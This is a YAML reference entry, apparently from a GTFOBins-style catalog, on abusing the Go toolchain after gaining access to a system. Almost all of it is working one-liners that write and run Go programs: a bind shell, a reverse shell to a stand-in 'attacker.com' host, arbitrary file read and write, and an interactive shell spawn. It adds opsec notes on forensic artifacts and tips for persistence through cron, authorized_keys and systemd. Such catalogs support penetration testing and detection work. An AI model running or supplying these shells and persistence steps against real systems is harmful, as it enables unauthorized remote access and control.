---
name: go
capabilities:
- exec
- spawn
- read
- write
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: |-
    echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
    go run /path/to/temp-file.go
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("/path/to/input-file")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go
    go run /path/to/temp-file.go
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("DATA\\n"))\n\tf.Close()\n}' >/path/to/temp-file.go
    go run /path/to/temp-file.go
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
    go run /path/to/temp-file.go
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >/path/to/temp-file.go
    go run /path/to/temp-file.go
references:
- https://gtfobins.github.io/gtfobins/go/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
